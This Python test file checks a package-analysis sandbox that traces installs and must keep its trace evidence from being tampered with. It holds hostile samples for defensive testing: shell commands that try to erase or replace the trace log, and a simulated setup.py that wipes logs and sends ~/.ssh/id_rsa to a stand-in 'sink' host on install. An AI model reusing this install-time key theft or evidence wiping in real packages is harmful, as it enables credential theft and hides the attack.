"""Bug 2: the analyzed package must not be able to touch the trace evidence, and any evidence problem is
tampering or uncertainty, never approval. Sandbox tests need Docker and `scripts/up.sh`; unit tests do not."""
import hashlib
import subprocess
import sys
import urllib.request

import pytest

from shadowrun import canary, config, db, pipeline, policy, sandbox
from shadowrun.sdist_tool import make_sdist

SANDBOX_UP = False
try:
    urllib.request.urlopen(config.PYPI_URL + "/", timeout=2)
    import docker
    docker.from_env().containers.get("sink")
    SANDBOX_UP = True
except Exception:
    pass
needs_sandbox = pytest.mark.skipif(not SANDBOX_UP, reason="sandbox services not up")


# ------------------------------------------------------------------ unit: evidence verification logic

class FakeContainer:
    """Stands in for a docker container; `exec_run` answers from a script of (matcher -> output)."""

    def __init__(self, stat="0 0 600 regular file", size=None, sha=None, rc="0", blob=b"7 1.0 execve(...) = 0\n",
                 done=True, status="running", fail=None):
        self.status = status
        self.blob, self.done, self.fail = blob, done, fail
        self.stat = stat
        self.size = len(blob) if size is None else size
        self.sha = hashlib.sha256(blob).hexdigest() if sha is None else sha
        self.rc = rc

    def reload(self):
        if self.fail == "reload":
            raise RuntimeError("daemon gone")

    def exec_run(self, cmd, user=None, demux=False):
        class R:
            pass
        r = R()
        if cmd[:2] == ["test", "-f"]:
            r.exit_code, r.output = (0 if self.done else 1), b""
        elif cmd[0] == "sh":
            if self.fail == "stat":
                r.exit_code, r.output = 1, b""
            else:
                out = f"{self.stat}\n{self.size}\n{self.sha}  /trace/trace.log\n{self.rc}\n"
                r.exit_code, r.output = 0, out.encode()
        elif cmd[0] == "cat":
            r.exit_code, r.output = (1, b"") if self.fail == "cat" else (0, self.blob)
        else:  # pragma: no cover
            raise AssertionError(cmd)
        return r


def test_good_evidence_is_trusted():
    ev = sandbox.collect_evidence(FakeContainer(), timed_out=False)
    assert ev.trusted and ev.done and ev.strace_rc == 0 and ev.trace_text.startswith("7 1.0") and ev.size == len(ev.trace_text)


@pytest.mark.parametrize("stat", ["1000 1000 600 regular file", "0 0 644 regular file", "0 0 600 symbolic link",
                                  "0 1000 600 regular file", "0 0 777 regular file"])
def test_changed_ownership_mode_or_type_is_tampering(stat):
    ev = sandbox.collect_evidence(FakeContainer(stat=stat), timed_out=False)
    assert ev.tampered and not ev.trusted


def test_hash_or_size_mismatch_is_tampering():
    assert sandbox.collect_evidence(FakeContainer(sha="0" * 64), False).tampered
    assert sandbox.collect_evidence(FakeContainer(size=999), False).tampered


@pytest.mark.parametrize("kwargs", [dict(fail="stat"), dict(fail="cat"), dict(fail="reload"), dict(status="exited"),
                                    dict(done=False)])
def test_collection_failures_are_errors_not_passes(kwargs):
    ev = sandbox.collect_evidence(FakeContainer(**kwargs), timed_out=False)
    assert ev.errors and not ev.trusted


def test_unfinished_wrapper_after_timeout_is_not_an_error_but_trace_is_still_partial():
    ev = sandbox.collect_evidence(FakeContainer(done=False), timed_out=True)
    assert ev.trusted and not ev.done  # partial trace; completeness (no exit notice) is judged by the parser


def test_oversize_trace_is_refused_not_truncated():
    ev = sandbox.collect_evidence(FakeContainer(size=sandbox.MAX_TRACE_BYTES + 1), False)
    assert any("larger" in e for e in ev.errors) and ev.trace_text == ""


def test_evidence_failures_map_to_denied_verdicts():
    from shadowrun.detector import RunContext, analyze
    cfg = __import__("shadowrun.detector", fromlist=["DetectorConfig"]).DetectorConfig.from_policy()
    tamper = sandbox.collect_evidence(FakeContainer(stat="1000 1000 600 regular file"), False)
    f = analyze([], RunContext(canary_paths=[], evidence_tampered=tamper.tampered, evidence_errors=tamper.errors,
                               trace_problems=[]), cfg)
    assert policy.decide(f).decision == "BLOCK"
    fail = sandbox.collect_evidence(FakeContainer(fail="cat"), False)
    f = analyze([], RunContext(canary_paths=[], evidence_errors=fail.errors, trace_problems=[]), cfg)
    d = policy.decide(f)
    assert d.decision == "ESCALATE" and d.indeterminate


def test_container_command_gives_trace_dir_to_root_only():
    script = sandbox._wrapper_script(False)
    assert "setpriv" in script and f"--reuid={config.UID}" in script and "/trace/trace.log" in script
    assert "-o /out" not in script


# ------------------------------------------------------------------ sandbox: real containers

@needs_sandbox
def test_package_user_cannot_modify_delete_replace_or_list_the_trace():
    cs = canary.create_home("test-tamper")
    try:
        attempts = ["echo x >> /trace/trace.log", ": > /trace/trace.log", "rm /trace/trace.log",
                    "mv /trace/trace.log /tmp/stolen", "ls /trace", "ln -s /etc/passwd /trace/trace.log",
                    "touch /trace/forged", "cat /trace/trace.log", "chmod 777 /trace", "kill -9 1"]
        loop = "; ".join(f"if sh -c '{a}' >/dev/null 2>&1; then echo SUCCEEDED:{i}; else echo BLOCKED:{i}; fi"
                         for i, a in enumerate(attempts))
        res, ev = sandbox.run_analysis(loop, home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    assert "SUCCEEDED" not in res.logs, res.logs
    assert res.logs.count("BLOCKED") == len(attempts)
    assert ev.trusted and ev.done and ev.strace_rc == 0
    assert "/trace/trace.log" in ev.trace_text  # every attempt was observed by the tracer (and denied)
    assert "EACCES" in ev.trace_text


@needs_sandbox
def test_package_runs_unprivileged_and_cannot_signal_the_tracer():
    cs = canary.create_home("test-uid")
    try:
        res, ev = sandbox.run_analysis("id -u; id -g; grep -E '^(CapEff|NoNewPrivs)' /proc/self/status",
                                       home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    lines = res.logs.split()
    assert lines[0] == str(config.UID) and lines[1] == str(config.GID)
    assert "CapEff:\t0000000000000000" in res.logs  # no effective capabilities for the package
    assert "NoNewPrivs:\t1" in res.logs
    assert ev.trusted


@needs_sandbox
def test_strace_failure_means_unavailable_evidence_and_the_package_never_runs(monkeypatch):
    monkeypatch.setattr(sandbox, "strace_prefix", lambda *a, **k: "strace --definitely-not-a-flag ")
    cs = canary.create_home("test-nostrace")
    try:
        res, ev = sandbox.run_analysis("echo package-ran", home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    assert not ev.trusted and ev.errors
    assert "package-ran" not in res.logs


@needs_sandbox
def test_timeout_yields_partial_but_flagged_evidence():
    cs = canary.create_home("test-timeout")
    try:
        res, ev = sandbox.run_analysis("sleep 60", home=cs.home, timeout=3)
    finally:
        canary.cleanup_home(cs)
    from shadowrun import monitor
    assert res.timed_out and not ev.done
    pr = monitor.parse_trace(ev.trace_text)
    assert pr.completeness_problems()  # no exit notice: cannot be treated as complete


# ------------------------------------------------------------------ end to end with a hostile package

HOSTILE_SETUP = '''# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import urllib.request
from setuptools import setup

for victim in ("/trace/trace.log", "/out/trace.log"):
    for action in ("truncate", "delete"):
        try:
            if action == "truncate":
                open(victim, "w").close()
            else:
                os.remove(victim)
        except Exception:
            pass
try:
    data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()
    urllib.request.urlopen(urllib.request.Request("http://sink:9000/collect", data=data, method="POST"), timeout=3)
except Exception:
    pass

setup(name="trace-wiper", version="1.0.0", description="SIMULATED TEST FIXTURE", py_modules=[])
'''


@pytest.fixture
def hostile_pkg(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e.db")
    dist = config.ROOT / "packages" / "dist"
    f = make_sdist("trace-wiper", "1.0.0", {"setup.py": HOSTILE_SETUP}, dist, "SIMULATED")
    yield "trace-wiper"
    f.unlink(missing_ok=True)


@needs_sandbox
def test_package_that_tries_to_wipe_its_trace_is_still_blocked_with_intact_evidence(hostile_pkg):
    run = pipeline.run_action(hostile_pkg)
    rules = {f["rule_id"] for f in run["findings"]}
    assert run["error"] is None, run
    assert run["decision"] == "BLOCK"
    assert {"CANARY_READ", "NET_OUTBOUND", "CANARY_EXFIL"} <= rules
    assert "EVIDENCE_TAMPERED" not in rules and "INCOMPLETE_TRACE" not in rules
    import json
    report = json.loads(run["report_json"])
    assert report["evidence"]["trusted"] and report["evidence"]["sha256"] and report["trace_problems"] == []
    # the wipe attempts are visible in the evidence the package could not erase
    saved = (config.TRACE_DIR / run["id"] / "trace.log").read_text()
    assert "/trace/trace.log" in saved and "EACCES" in saved
    assert report["doctor"]["id"]


@needs_sandbox
def test_pipeline_with_failed_tracer_is_indeterminate_and_denied(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e2.db")
    subprocess.check_call([sys.executable, str(config.ROOT / "packages" / "build_all.py")], stdout=subprocess.DEVNULL)
    monkeypatch.setattr(sandbox, "strace_prefix", lambda *a, **k: "strace --definitely-not-a-flag ")
    run = pipeline.run_action("csvtoolkit")
    assert run["decision"] == "ESCALATE" and run["decision_obj"].indeterminate
    assert "EVIDENCE_UNAVAILABLE" in {f["rule_id"] for f in run["findings"]}
    assert run["findings"] and "csvtoolkit" == run["package_name"]


@needs_sandbox
def test_parser_crash_is_denied_not_allowed(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e3.db")
    subprocess.check_call([sys.executable, str(config.ROOT / "packages" / "build_all.py")], stdout=subprocess.DEVNULL)

    def boom(text):
        raise RuntimeError("parser exploded")
    monkeypatch.setattr(pipeline.monitor, "parse_trace", boom)
    run = pipeline.run_action("csvtoolkit")
    assert run["decision"] == "ESCALATE" and run["decision_obj"].indeterminate and "parser exploded" in run["error"]
